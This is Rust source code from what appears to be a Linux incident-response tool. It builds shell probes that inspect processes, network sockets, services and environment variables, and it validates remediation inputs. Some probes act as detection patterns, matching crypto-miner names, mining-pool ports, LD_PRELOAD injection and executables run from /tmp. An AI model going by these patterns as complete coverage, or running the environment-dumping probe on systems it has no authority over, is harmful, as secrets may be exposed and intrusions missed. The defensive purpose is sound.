        ProcessInvestigationAction::MemoryMaps => "head -n 100 \"/proc/$p/maps\" 2>/dev/null",
        ProcessInvestigationAction::ResourceLimits => "cat \"/proc/$p/limits\" 2>/dev/null",
        ProcessInvestigationAction::IoStats => "cat \"/proc/$p/io\" 2>/dev/null",
        ProcessInvestigationAction::MemoryUsage => {
            "awk '/^Vm/{print}' \"/proc/$p/status\" 2>/dev/null"
        }
        ProcessInvestigationAction::Smaps => "head -n 200 \"/proc/$p/smaps\" 2>/dev/null",
        ProcessInvestigationAction::Environment => {
            "tr '\\0' '\\n' < \"/proc/$p/environ\" 2>/dev/null | head -n 200"
        }
        ProcessInvestigationAction::NetworkConnections => {
            "ss -H -tunap 2>/dev/null | grep -F \"pid=$p,\" | head -n 100"
        }
        ProcessInvestigationAction::ListeningPorts => {
            "ss -H -tulnp 2>/dev/null | grep -F \"pid=$p,\" | head -n 100"
        }
        ProcessInvestigationAction::NetworkStatus => {
            "printf 'TCP\\n'; ss -H -tnp 2>/dev/null | grep -F \"pid=$p,\" | head -n 100; printf '\\nUDP\\n'; ss -H -unp 2>/dev/null | grep -F \"pid=$p,\" | head -n 100; printf '\\nSOCKETS\\n'; find \"/proc/$p/fd\" -mindepth 1 -maxdepth 1 -type l -exec readlink {} \\; 2>/dev/null | grep '^socket:' | head -n 100"
        }
        ProcessInvestigationAction::DnsSockets => {
            "ss -H -tunap 2>/dev/null | grep -F \"pid=$p,\" | awk '$5 ~ /:53$/ || $6 ~ /:53$/ {print}' | head -n 100"
        }
        ProcessInvestigationAction::ProcessTree => {
            "if command -v pstree >/dev/null 2>&1; then pstree -aps \"$p\" 2>/dev/null; else ps -o pid=,ppid=,user=,stat=,args= -p \"$p\" --ppid \"$p\" 2>/dev/null; fi"
        }
        ProcessInvestigationAction::Children => {
            "ps -o pid=,ppid=,user=,stat=,args= --ppid \"$p\" 2>/dev/null | head -n 100"
        }
        ProcessInvestigationAction::Parent => {
            "pp=$(ps -o ppid= -p \"$p\" 2>/dev/null | xargs); [ -n \"$pp\" ] && ps -o pid=,ppid=,user=,stat=,args= -p \"$pp\" 2>/dev/null"
        }
        ProcessInvestigationAction::Threads => {
            "printf 'Thread count: '; find \"/proc/$p/task\" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | wc -l; ps -T -p \"$p\" -o pid=,spid=,stat=,comm= 2>/dev/null | head -n 100"
        }
        ProcessInvestigationAction::CpuUsage => {
            "ps -p \"$p\" -o pid=,ppid=,pcpu=,pmem=,vsz=,rss=,stat=,lstart=,time=,args= 2>/dev/null; i=0; while [ \"$i\" -lt 5 ]; do ps -p \"$p\" -o pcpu= 2>/dev/null || exit 0; i=$((i+1)); [ \"$i\" -lt 5 ] && sleep 1; done"
        }
        ProcessInvestigationAction::CpuAffinity => "taskset -cp \"$p\" 2>/dev/null",
        ProcessInvestigationAction::ContextSwitches => {
            "awk '/^(voluntary_ctxt_switches|nonvoluntary_ctxt_switches):/' \"/proc/$p/status\" 2>/dev/null"
        }
        ProcessInvestigationAction::OomScore => {
            "printf 'oom_score\\t'; cat \"/proc/$p/oom_score\" 2>/dev/null; printf 'oom_score_adj\\t'; cat \"/proc/$p/oom_score_adj\" 2>/dev/null"
        }
        ProcessInvestigationAction::Scheduler => {
            "ps -p \"$p\" -o pid=,pri=,ni=,rtprio=,sched=,stat=,wchan:32=,args= 2>/dev/null"
        }
        ProcessInvestigationAction::SyscallSnapshot => {
            "if command -v timeout >/dev/null 2>&1 && command -v strace >/dev/null 2>&1; then timeout -s INT 5 strace -qq -c -p \"$p\" 2>&1; code=$?; [ \"$code\" -eq 124 ] || [ \"$code\" -eq 130 ] || exit \"$code\"; else printf 'strace 或 timeout 不可用\\n'; fi"
        }
        ProcessInvestigationAction::KernelStack => "head -n 100 \"/proc/$p/stack\" 2>/dev/null",
        ProcessInvestigationAction::FileDescriptorStats => {
            "printf 'Open file descriptors: '; find \"/proc/$p/fd\" -mindepth 1 -maxdepth 1 2>/dev/null | wc -l; awk '/Max open files/{print}' \"/proc/$p/limits\" 2>/dev/null"
        }
        ProcessInvestigationAction::Signals => {
            "awk '/^(Sig|Shd)/{print}' \"/proc/$p/status\" 2>/dev/null"
        }
        ProcessInvestigationAction::Namespaces => "ls -l \"/proc/$p/ns\" 2>/dev/null",
        ProcessInvestigationAction::Cgroup => "cat \"/proc/$p/cgroup\" 2>/dev/null",
        ProcessInvestigationAction::Container => {
            "printf 'cgroup\\n'; cat \"/proc/$p/cgroup\" 2>/dev/null; printf '\\nmountinfo indicators\\n'; grep -E 'docker|containerd|kubepods|lxc|libpod' \"/proc/$p/mountinfo\" 2>/dev/null | head -n 50"
        }
        ProcessInvestigationAction::Uptime => "ps -p \"$p\" -o lstart=,etimes= 2>/dev/null",
        ProcessInvestigationAction::SuspiciousPath => {
            "exe=$(readlink \"/proc/$p/exe\" 2>/dev/null); cwd=$(readlink \"/proc/$p/cwd\" 2>/dev/null); printf 'Executable\\t%s\\nWorking directory\\t%s\\n' \"$exe\" \"$cwd\"; case \"$exe\" in /tmp/*|/dev/shm/*|/var/tmp/*) printf 'Executable risk\\tsuspicious-path\\n';; *) printf 'Executable risk\\tnormal-path\\n';; esac; case \"$cwd\" in /tmp/*|/dev/shm/*|/var/tmp/*) printf 'Working directory risk\\tsuspicious-path\\n';; *) printf 'Working directory risk\\tnormal-path\\n';; esac"
        }
        ProcessInvestigationAction::HiddenProcess => {
            "if ps -p \"$p\" >/dev/null 2>&1; then printf 'ps visibility\\tvisible\\n'; else printf 'ps visibility\\tnot-visible\\n'; fi; if [ -d \"/proc/$p\" ]; then printf 'proc visibility\\tpresent\\n'; else printf 'proc visibility\\tabsent\\n'; fi"
        }
        ProcessInvestigationAction::LdPreload => {
            "tr '\\0' '\\n' < \"/proc/$p/environ\" 2>/dev/null | grep -E '^(LD_PRELOAD|LD_LIBRARY_PATH)=' || printf 'No LD_PRELOAD or LD_LIBRARY_PATH in process environment\\n'"
        }
        ProcessInvestigationAction::DeletedExecutable => {
            "exe=$(readlink \"/proc/$p/exe\" 2>/dev/null); printf '%s\\n' \"$exe\"; case \"$exe\" in *' (deleted)') printf 'Result\\tdeleted executable\\n';; *) printf 'Result\\texecutable present\\n';; esac"
        }
        ProcessInvestigationAction::SuspiciousNetwork => {
            "ss -H -tnp 2>/dev/null | grep -F \"pid=$p,\" | head -n 100"
        }
        ProcessInvestigationAction::CryptoMining => {
            "printf 'Command indicators\\n'; tr '\\0' ' ' < \"/proc/$p/cmdline\" 2>/dev/null | grep -Eio 'xmrig|minerd|cpuminer|stratum|cryptonight|mining' | sort -u || true; printf '\\nPool-port connections\\n'; ss -H -tnp 2>/dev/null | grep -F \"pid=$p,\" | grep -E ':(3333|4444|5555|14444)([[:space:]]|$)' | head -n 100 || true; printf '\\nCPU\\n'; ps -p \"$p\" -o pcpu=,pmem=,args= 2>/dev/null"
        }
    };
    format!("p={pid}; [ -d \"/proc/$p\" ] || exit 44; {probe}")
}

fn parse_detail(request: &SystemInfoDetailRequest, output: &str) -> SystemInfoDetail {
    let fields = output
        .lines()
        .filter_map(|line| line.split_once('\t'))
        .take(64)
        .map(|(label, value)| SystemInfoDetailField {
            label: bounded_text(label, 128),
            value: bounded_text(value, MAX_CELL_CHARS),
        })
        .collect();
    SystemInfoDetail {
        tab: request.tab,
        row_id: request.row_id.clone(),
        fields,
    }
}

fn command_failed(subject: &'static str, output: &crate::ssh::SshCommandOutput) -> CoreError {
    CoreError::Validation {
        subject: "system information command",
        message: format!(
            "{subject} failed (exit={:?}, timed_out={})",
            output.exit_code, output.timed_out
        ),
    }
}

fn parse_summary(output: &str) -> CoreResult<SystemInfoSummary> {
    let values: BTreeMap<_, _> = output
        .lines()
        .filter_map(|line| line.split_once('\t'))
        .map(|(key, value)| (key, bounded_text(value, MAX_SUMMARY_CHARS)))
        .collect();
    let get = |key: &str| values.get(key).cloned().unwrap_or_default();
    if get("hostname").is_empty() {
        return Err(CoreError::Validation {
            subject: "system summary output",
            message: "missing hostname marker".to_owned(),
        });
    }
    let loads: Vec<_> = get("load")
        .split_whitespace()
        .take(3)
        .map(ToOwned::to_owned)
        .collect();
    Ok(SystemInfoSummary {
        hostname: get("hostname"),
        operating_system: get("os"),
        kernel: get("kernel"),
        architecture: get("architecture"),
        virtualization: get("virtualization"),
        boot_time: get("boot_time"),
        timezone: get("timezone"),
        locale: get("locale"),
        init_system: get("init_system"),
        package_manager: get("package_manager"),
        selinux: get("selinux"),
        apparmor: get("apparmor"),
        uptime_seconds: parse_first_u64(&get("uptime")),
        load_average: [
            loads.first().cloned().unwrap_or_else(|| "0".to_owned()),
            loads.get(1).cloned().unwrap_or_else(|| "0".to_owned()),
            loads.get(2).cloned().unwrap_or_else(|| "0".to_owned()),
        ],
        cpu_model: get("cpu_model"),
        cpu_cores: parse_first_u64(&get("cpu_cores")).try_into().unwrap_or(0),
        memory_total_bytes: parse_first_u64(&get("mem_total")),
        memory_available_bytes: parse_first_u64(&get("mem_available")),
        swap_total_bytes: parse_first_u64(&get("swap_total")),
        swap_free_bytes: parse_first_u64(&get("swap_free")),
        root_device: get("root_device"),
        root_filesystem: get("root_filesystem"),
        root_total_bytes: parse_first_u64(&get("root_total")),
        root_available_bytes: parse_first_u64(&get("root_available")),
        primary_ip: get("primary_ip"),
        default_gateway: get("default_gateway"),
        dns_servers: get("dns_servers"),
        process_count: parse_first_u64(&get("processes")).try_into().unwrap_or(0),
        logged_in_users: parse_first_u64(&get("users")).try_into().unwrap_or(0),
        network_connections: parse_first_u64(&get("connections")).try_into().unwrap_or(0),
        received_bytes: parse_first_u64(&get("rx")),
        transmitted_bytes: parse_first_u64(&get("tx")),
    })
}

fn parse_table(request: &SystemInfoRequest, output: &str) -> SystemInfoTable {
    let column_count = request.tab.columns().len();
    let mut rows = Vec::new();
    let mut duplicate_ids = BTreeMap::<String, usize>::new();
    let mut saw_extra = false;
    for line in output.lines().filter(|line| !line.is_empty()) {
        if rows.len() == request.maximum_rows {
            saw_extra = true;
            break;
        }
        let mut cells: Vec<_> = line
            .splitn(column_count, '\t')
            .map(|cell| bounded_text(cell, MAX_CELL_CHARS))
            .collect();
        cells.resize(column_count, String::new());
        let risk = infer_risk(&cells);
        let base_id = stable_row_id(request.tab, &cells);
        let duplicate = duplicate_ids.entry(base_id.clone()).or_default();
        let id = format!("{base_id}-{duplicate}");
        *duplicate += 1;
        rows.push(SystemInfoRow { id, cells, risk });
    }
    SystemInfoTable {
        tab: request.tab,
        columns: request
            .tab
            .columns()
            .iter()
            .map(|column| (*column).to_owned())
            .collect(),
        rows,
        truncated: saw_extra,
    }
}

fn stable_row_id(tab: SystemInfoTab, cells: &[String]) -> String {
    let mut digest = Sha256::new();
    digest.update(tab_id(tab).as_bytes());
    for index in primary_key_columns(tab) {
        digest.update([0]);
        if let Some(cell) = cells.get(*index) {
            digest.update(cell.as_bytes());
        }
    }
    let digest = format!("{:x}", digest.finalize());
    format!("{}-{}", tab_id(tab), &digest[..24])
}

fn invalid_detail_key(subject: &'static str) -> CoreError {
    CoreError::Validation {
        subject: "system information detail identity",
        message: format!("invalid {subject}"),
    }
}

fn is_valid_unit_name(value: &str) -> bool {
    value
        .bytes()
        .next()
        .is_some_and(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
        && value.len() <= 256
        && value.bytes().all(|byte| {
            byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.' | b'@' | b':')
        })
}

fn is_valid_ssh_key_type(value: &str) -> bool {
    matches!(
        value,
        "ssh-rsa"
            | "ssh-ed25519"
            | "ecdsa-sha2-nistp256"
            | "ecdsa-sha2-nistp384"
            | "ecdsa-sha2-nistp521"
            | "sk-ssh-ed25519@openssh.com"
            | "sk-ecdsa-sha2-nistp256@openssh.com"
    )
}

fn is_valid_ssh_key_content(value: &str) -> bool {
    (16..=8_192).contains(&value.len())
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'/' | b'='))
}

fn validated_absolute_path(value: &str) -> CoreResult<String> {
    if value.starts_with('/')
        && value.len() <= MAX_CELL_CHARS
        && !value.chars().any(char::is_control)
    {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("absolute path"))
    }
}

fn is_valid_package_name(value: &str) -> bool {
    value
        .bytes()
        .next()
        .is_some_and(|byte| byte.is_ascii_alphanumeric())
        && value.len() <= 256
        && value.bytes().all(|byte| {
            byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'-' | b'.' | b':' | b'_')
        })
}

fn is_valid_module_name(value: &str) -> bool {
    value
        .bytes()
        .next()
        .is_some_and(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
        && value.len() <= 128
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.'))
}

fn managed_module_policy_path(module: &str) -> CoreResult<RemotePath> {
    if !is_valid_module_name(module) {
        return Err(invalid_detail_key("kernel module name"));
    }
    RemotePath::new(format!("/etc/modprobe.d/lovelyres-blacklist-{module}.conf"))
}

fn managed_module_policy_content(module: &str) -> CoreResult<Vec<u8>> {
    if !is_valid_module_name(module) {
        return Err(invalid_detail_key("kernel module name"));
    }
    Ok(format!(
        "# Managed by LovelyRes; remove through LovelyRes to preserve audit history.\nblacklist {module}\n"
    )
    .into_bytes())
}

fn is_valid_environment_name(value: &str) -> bool {
    value.len() <= 128
        && value
            .bytes()
            .next()
            .is_some_and(|byte| byte.is_ascii_alphabetic() || byte == b'_')
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
}

fn is_valid_service_unit(value: &str) -> bool {
    value.ends_with(".service") && is_valid_unit_name(value)
}

fn is_valid_timer_unit(value: &str) -> bool {
    value.ends_with(".timer") && is_valid_unit_name(value)
}

fn validated_username(value: &str) -> CoreResult<String> {
    if is_valid_username(value) {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("Linux username"))
    }
}

fn validated_inert_command(value: &str) -> CoreResult<String> {
    if !value.trim().is_empty()
        && value.len() <= MAX_CELL_CHARS
        && !value.chars().any(char::is_control)
    {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("inert command text"))
    }
}

fn validated_cron_schedule(value: &str) -> CoreResult<String> {
    let fields = value.split_ascii_whitespace().collect::<Vec<_>>();
    let safe = fields.len() == 5
        && value.len() <= 256
        && fields.iter().all(|field| {
            !field.is_empty()
                && field.len() <= 64
                && field.bytes().all(|byte| {
                    byte.is_ascii_alphanumeric() || matches!(byte, b'*' | b',' | b'-' | b'/')
                })
        });
    if safe {
        Ok(fields.join(" "))
    } else {
        Err(invalid_detail_key("cron schedule"))
    }
}

fn is_valid_safe_basename(value: &str) -> bool {
    !value.is_empty()
        && value != "."
        && value != ".."
        && value.len() <= 128
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.'))
}

fn validated_cron_source(value: &str) -> CoreResult<String> {
    let valid = value == "/etc/crontab"
        || value
            .strip_prefix("/etc/cron.d/")
            .is_some_and(is_valid_safe_basename);
    if valid {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("cron source file"))
    }
}

fn validated_deletable_cron_path(value: &str) -> CoreResult<RemotePath> {
    let basename = value
        .strip_prefix("/etc/cron.d/")
        .filter(|basename| is_valid_safe_basename(basename))
        .ok_or_else(|| {
            CoreError::validation(
                "cron file mutation",
                "only validated independent files directly below /etc/cron.d may be removed",
            )
        })?;
    if basename.starts_with('.') {
        return Err(CoreError::validation(
            "cron file mutation",
            "hidden cron files are outside the managed inventory",
        ));
    }
    RemotePath::new(value)
}

fn validated_shell_config_path(value: &str) -> CoreResult<String> {
    let valid = matches!(value, "/etc/profile" | "/etc/bash.bashrc" | "/root/.bashrc")
        || value
            .strip_prefix("/home/")
            .and_then(|suffix| suffix.strip_suffix("/.bashrc"))
            .is_some_and(is_valid_username);
    if valid {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("shell configuration path"))
    }
}

fn validated_line_number(value: &str) -> CoreResult<u32> {
    value
        .parse::<u32>()
        .ok()
        .filter(|line| (1..=10_000_000).contains(line))
        .ok_or_else(|| invalid_detail_key("line number"))
}

fn validated_shell_line(value: &str) -> CoreResult<String> {
    if !value.is_empty()
        && value.len() <= MAX_CELL_CHARS
        && !value.chars().any(|character| character.is_control())
    {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("shell configuration content"))
    }
}

fn validated_octal_mode(value: &str) -> CoreResult<u32> {
    if !(1..=4).contains(&value.len()) || !value.bytes().all(|byte| matches!(byte, b'0'..=b'7')) {
        return Err(invalid_detail_key("octal file mode"));
    }
    u32::from_str_radix(value, 8).map_err(|_| invalid_detail_key("octal file mode"))
}

fn validated_suid_path(value: &str) -> CoreResult<RemotePath> {
    let path = RemotePath::new(value)?;
    let allowed = [
        "/bin/",
        "/sbin/",
        "/usr/bin/",
        "/usr/sbin/",
        "/usr/local/bin/",
    ];
    if allowed.iter().any(|prefix| value.starts_with(prefix)) {
        Ok(path)
    } else {
        Err(CoreError::validation(
            "SUID file mutation",
            "path is outside the collected executable roots",
        ))
    }
}

fn comment_shell_line(
    content: &[u8],
    line_number: u32,
    displayed_content: &str,
) -> CoreResult<Vec<u8>> {
    let text = std::str::from_utf8(content).map_err(|error| {
        CoreError::validation(
            "shell configuration mutation",
            format!("configuration must be UTF-8 text: {error}"),
        )
    })?;
    let line_index = usize::try_from(line_number.saturating_sub(1)).map_err(|_| {
        CoreError::validation(
            "shell configuration mutation",
            "line number is out of range",
        )
    })?;
    let mut replacement = Vec::with_capacity(content.len().saturating_add(32));
    let mut found = false;
    for (index, line) in text.split_inclusive('\n').enumerate() {
        if index != line_index {
            replacement.extend_from_slice(line.as_bytes());
            continue;
        }
        let body = line
            .strip_suffix('\n')
            .unwrap_or(line)
            .strip_suffix('\r')
            .unwrap_or_else(|| line.strip_suffix('\n').unwrap_or(line));
        if body.replace('\t', " ") != displayed_content {
            return Err(CoreError::validation(
                "shell configuration mutation",
                "the selected line changed after the inventory row was collected",
            ));
        }
        if body.trim_start().starts_with('#') {
            return Err(CoreError::validation(
                "shell configuration mutation",
                "the selected line is already a comment",
            ));
        }
        replacement.extend_from_slice(b"# LovelyRes disabled: ");
        replacement.extend_from_slice(line.as_bytes());
        found = true;
    }
    if !found {
        return Err(CoreError::validation(
            "shell configuration mutation",
            "the selected line no longer exists",
        ));
    }
    if replacement.len() as u64 > MAX_EDIT_BYTES {
        return Err(CoreError::validation(
            "shell configuration mutation",
            format!("replacement exceeds the {MAX_EDIT_BYTES}-byte managed edit limit"),
        ));
    }
    Ok(replacement)
}

fn validated_sudo_principal(value: &str) -> CoreResult<String> {
    let valid = !value.is_empty()
        && value.len() <= 128
        && !value.starts_with('-')
        && value.bytes().all(|byte| {
            byte.is_ascii_alphanumeric()
                || matches!(byte, b'_' | b'-' | b'.' | b'%' | b'@' | b'+' | b'#' | b':')
        });
    if valid {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("sudoers principal"))
    }
}

fn validated_sudoers_source(value: &str) -> CoreResult<String> {
    let valid = value == "/etc/sudoers"
        || value
            .strip_prefix("/etc/sudoers.d/")
            .is_some_and(is_valid_safe_basename);
    if valid {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("sudoers source file"))
    }
}

fn validated_authorized_keys_path(value: &str) -> CoreResult<String> {
    let valid = value == "/root/.ssh/authorized_keys"
        || value
            .strip_prefix("/home/")
            .and_then(|suffix| suffix.strip_suffix("/.ssh/authorized_keys"))
            .is_some_and(is_valid_username);
    if valid {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("authorized_keys path"))
    }
}

fn file_detail_command(path: &str) -> String {
    let path = shq(path);
    format!(
        "p={path}; printf 'Canonical Path\\t'; readlink -f -- \"$p\" 2>/dev/null; \
printf 'File Type\\t'; file -b -- \"$p\" 2>/dev/null; \
printf 'Owner\\t'; stat -c '%U (%u)' -- \"$p\" 2>/dev/null; \
printf 'Group\\t'; stat -c '%G (%g)' -- \"$p\" 2>/dev/null; \
printf 'Mode\\t'; stat -c '%A (%a)' -- \"$p\" 2>/dev/null; \
printf 'Size Bytes\\t'; stat -c '%s' -- \"$p\" 2>/dev/null; \
printf 'Modified\\t'; stat -c '%y' -- \"$p\" 2>/dev/null; \
printf 'SHA256\\t'; sha256sum -- \"$p\" 2>/dev/null | awk '{{print $1}}'; \
printf 'Capabilities\\t'; getcap -n -- \"$p\" 2>/dev/null | cut -d' ' -f2-"
    )
}

const fn primary_key_columns(tab: SystemInfoTab) -> &'static [usize] {
    match tab {
        SystemInfoTab::Processes => &[1],
        SystemInfoTab::Network => &[0, 1, 2, 4],
        SystemInfoTab::Services => &[0],
        SystemInfoTab::Established => &[0, 1, 2, 3, 4],
        SystemInfoTab::OpenPorts => &[0, 1, 2, 3],
        SystemInfoTab::Users => &[0, 1],
        SystemInfoTab::Autostart => &[0],
        SystemInfoTab::Cron => &[0, 1, 2, 3],
        SystemInfoTab::SshKeys => &[0, 1, 2, 4],
        SystemInfoTab::LoginHistory => &[0, 1, 2, 3],
        SystemInfoTab::SuidFiles => &[0],
        SystemInfoTab::Autoruns => &[0, 1, 3],
        SystemInfoTab::Firewall => &[0, 1, 2, 3, 4, 5],
        SystemInfoTab::EnvVars => &[0],
        SystemInfoTab::ShellConfigs => &[0, 3],
        SystemInfoTab::Packages => &[0],
        SystemInfoTab::Sudoers => &[0, 1, 2, 4],
        SystemInfoTab::Timers => &[0],
        SystemInfoTab::KernelModules => &[0],
        SystemInfoTab::Rootcheck => &[0],
        SystemInfoTab::Sensitive => &[0],
        SystemInfoTab::RecentFiles => &[0],
        SystemInfoTab::Docker => &[0],
        SystemInfoTab::Kubernetes => &[0, 1],
        SystemInfoTab::WebApps => &[0, 1],
    }
}

fn infer_risk(cells: &[String]) -> SystemInfoRisk {
    let text = cells.join(" ").to_lowercase();
    if ["high", "critical", "malicious", "backdoor", "高危", "危险"]
        .iter()
        .any(|needle| text.contains(needle))
    {
        SystemInfoRisk::High
    } else if [
        "warning",
        "suspicious",
        "failed",
        "nopasswd",
        "可疑",
        "异常",
        "失败",
    ]
    .iter()
    .any(|needle| text.contains(needle))
    {
        SystemInfoRisk::Warning
    } else {
        SystemInfoRisk::Normal
    }
}

fn bounded_text(value: &str, maximum_chars: usize) -> String {
    value
        .chars()
        .map(|character| {
            if character == '\t' || character.is_control() {
                ' '
            } else {
                character
            }
        })
        .take(maximum_chars)
        .collect()
}

fn parse_first_u64(value: &str) -> u64 {
    value
        .split_whitespace()
        .next()
        .and_then(|value| value.parse().ok())
        .unwrap_or(0)
}

const fn tab_id(tab: SystemInfoTab) -> &'static str {
    match tab {
        SystemInfoTab::Processes => "processes",
        SystemInfoTab::Network => "network",
        SystemInfoTab::Services => "services",
        SystemInfoTab::Established => "established",
        SystemInfoTab::OpenPorts => "openports",
        SystemInfoTab::Users => "users",
        SystemInfoTab::Autostart => "autostart",
        SystemInfoTab::Cron => "cron",
        SystemInfoTab::SshKeys => "sshkeys",
        SystemInfoTab::LoginHistory => "loginhistory",
        SystemInfoTab::SuidFiles => "suidfiles",
        SystemInfoTab::Autoruns => "autoruns",
        SystemInfoTab::Firewall => "firewall",
        SystemInfoTab::EnvVars => "envvars",
        SystemInfoTab::ShellConfigs => "shellconfigs",
        SystemInfoTab::Packages => "packages",
        SystemInfoTab::Sudoers => "sudoers",
        SystemInfoTab::Timers => "timers",
        SystemInfoTab::KernelModules => "kernelmodules",
        SystemInfoTab::Rootcheck => "rootcheck",
        SystemInfoTab::Sensitive => "sensitive",
        SystemInfoTab::RecentFiles => "recentfiles",
        SystemInfoTab::Docker => "docker",
        SystemInfoTab::Kubernetes => "kubernetes",
        SystemInfoTab::WebApps => "webapps",
    }
}

const SUMMARY_COMMAND: &str = r#"printf 'hostname\t'; hostname 2>/dev/null | head -n 1
printf 'os\t'; sed -n 's/^PRETTY_NAME=//p' /etc/os-release 2>/dev/null | head -n 1 | tr -d '"'
printf 'kernel\t'; uname -srmo 2>/dev/null | head -n 1
printf 'architecture\t'; uname -m 2>/dev/null | head -n 1
printf 'virtualization\t'; v=$(systemd-detect-virt 2>/dev/null || true); printf '%s\n' "${v:-physical-or-unknown}"
printf 'boot_time\t'; (uptime -s 2>/dev/null || who -b 2>/dev/null | awk '{$1="";$2="";sub(/^  */,"");print}') | head -n 1
printf 'timezone\t'; z=$(timedatectl show -p Timezone --value 2>/dev/null || true); [ -n "$z" ] || z=$(date +%Z 2>/dev/null); printf '%s\n' "$z"
printf 'locale\t'; printf '%s\n' "${LANG:-unknown}"
printf 'init_system\t'; readlink -f /proc/1/exe 2>/dev/null | awk -F/ '{print $NF}'
printf 'package_manager\t'; for p in apt-get dnf yum zypper pacman apk rpm dpkg; do command -v "$p" >/dev/null 2>&1 && { printf '%s\n' "$p"; break; }; done
printf 'selinux\t'; if command -v getenforce >/dev/null 2>&1; then getenforce 2>/dev/null; else printf 'unavailable\n'; fi
printf 'apparmor\t'; if command -v aa-status >/dev/null 2>&1; then aa-status --enabled >/dev/null 2>&1 && printf 'enabled\n' || printf 'disabled\n'; elif [ -d /sys/module/apparmor ]; then printf 'present\n'; else printf 'unavailable\n'; fi
printf 'uptime\t'; awk '{print int($1)}' /proc/uptime 2>/dev/null
printf 'load\t'; awk '{print $1" "$2" "$3}' /proc/loadavg 2>/dev/null
printf 'cpu_model\t'; sed -n 's/^model name[[:space:]]*:[[:space:]]*//p' /proc/cpuinfo 2>/dev/null | head -n 1
printf 'cpu_cores\t'; (command -v nproc >/dev/null 2>&1 && nproc) || grep -c '^processor' /proc/cpuinfo 2>/dev/null
awk '/^MemTotal:/{t=$2*1024}/^MemAvailable:/{a=$2*1024}/^SwapTotal:/{st=$2*1024}/^SwapFree:/{sf=$2*1024} END{printf "mem_total\t%.0f\nmem_available\t%.0f\nswap_total\t%.0f\nswap_free\t%.0f\n",t,a,st,sf}' /proc/meminfo 2>/dev/null
df -B1 -PT / 2>/dev/null | awk 'NR==2{print "root_device\t"$1"\nroot_filesystem\t"$2"\nroot_total\t"$3"\nroot_available\t"$5}'
printf 'primary_ip\t'; hostname -I 2>/dev/null | awk '{print $1}'
printf 'default_gateway\t'; ip route show default 2>/dev/null | awk 'NR==1{print $3}'
printf 'dns_servers\t'; awk '/^nameserver[[:space:]]+/{print $2}' /etc/resolv.conf 2>/dev/null | paste -sd ',' -
printf 'processes\t'; ps -e --no-headers 2>/dev/null | wc -l
printf 'users\t'; who 2>/dev/null | wc -l
printf 'connections\t'; (ss -H -tun 2>/dev/null || netstat -tun 2>/dev/null | tail -n +3) | wc -l
awk -F'[: ]+' 'NR>2 && $1!="lo"{rx+=$3;tx+=$11} END{printf "rx\t%.0f\ntx\t%.0f\n",rx,tx}' /proc/net/dev 2>/dev/null"#;

const PROCESS_COMMAND: &str = r#"ps -eo pid=,ppid=,user=,stat=,pcpu=,pmem=,etimes=,args= --no-headers 2>/dev/null | head -n 500 | awk '{risk="normal"; cmd=""; for(i=8;i<=NF;i++) cmd=cmd (i==8?"":" ") $i; if($4 ~ /^Z/ || $5+0>=80) risk="warning"; gsub(/\t/," ",cmd); print risk"\t"$1"\t"$2"\t"$3"\t"$4"\t"$5"\t"$6"\t"$7"\t"cmd}'"#;
const NETWORK_COMMAND: &str = r#"if command -v ss >/dev/null 2>&1; then ss -H -tunap 2>/dev/null | head -n 500 | awk '{proc=""; for(i=7;i<=NF;i++) proc=proc (i==7?"":" ") $i; gsub(/\t/," ",proc); pid=proc; sub(/^.*pid=/,"",pid); sub(/,.*/,"",pid); if(pid !~ /^[0-9]+$/) pid=""; print $1"\t"$5"\t"$6"\t"$2"\t"pid"\t"proc}'; else netstat -tunap 2>/dev/null | tail -n +3 | head -n 500 | awk '{proc=$7; gsub(/\t/," ",proc); pid=proc; sub(/\/.*/,"",pid); if(pid !~ /^[0-9]+$/) pid=""; print $1"\t"$4"\t"$5"\t"$6"\t"pid"\t"proc}'; fi"#;
const SERVICES_COMMAND: &str = r#"systemctl list-units --type=service --all --no-pager --no-legend 2>/dev/null | head -n 500 | awk '{desc=""; for(i=5;i<=NF;i++) desc=desc (i==5?"":" ") $i; gsub(/\t/," ",desc); print $1"\t"$4"\t"$3"\t"desc}'"#;
const ESTABLISHED_COMMAND: &str = r#"if command -v ss >/dev/null 2>&1; then ss -H -tnp state established 2>/dev/null | head -n 500 | awk '{proc=""; for(i=6;i<=NF;i++) proc=proc (i==6?"":" ") $i; gsub(/\t/," ",proc); pid=proc; sub(/^.*pid=/,"",pid); sub(/,.*/,"",pid); if(pid !~ /^[0-9]+$/) pid=""; port=$5; sub(/^.*:/,"",port); print $4"\t"$5"\t"port"\t"pid"\t"proc"\t"}'; else netstat -tnp 2>/dev/null | awk '$6=="ESTABLISHED" {proc=$7; gsub(/\t/," ",proc); pid=proc; sub(/\/.*/,"",pid); if(pid !~ /^[0-9]+$/) pid=""; port=$5; sub(/^.*:/,"",port); print $4"\t"$5"\t"port"\t"pid"\t"proc"\t"}' | head -n 500; fi"#;
